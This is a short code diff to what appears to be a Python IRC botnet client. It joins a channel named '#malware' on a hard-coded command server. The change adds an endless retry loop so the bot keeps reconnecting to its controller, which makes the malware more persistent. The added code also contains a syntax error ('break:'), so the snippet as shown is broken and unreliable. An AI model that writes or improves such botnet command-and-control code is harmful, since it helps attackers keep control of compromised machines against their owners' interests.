@@ -155,12 +155,16 @@ def shutdown():
 server="192.168.1.30"
 botnick=botName()
 channel="#malware"
-
-irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-irc.connect((server,6667))
-irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :r\r\n")
-irc.send("NICK "+ botnick +"\n")
-irc.send("JOIN "+ channel +"\n")
+while 1:
+	try:
+		irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		irc.connect((server,6667))
+		irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :r\r\n")
+		irc.send("NICK "+ botnick +"\n")
+		irc.send("JOIN "+ channel +"\n")
+		break:
+	except Exception:
+		pass
 
 while 1:
 	try:
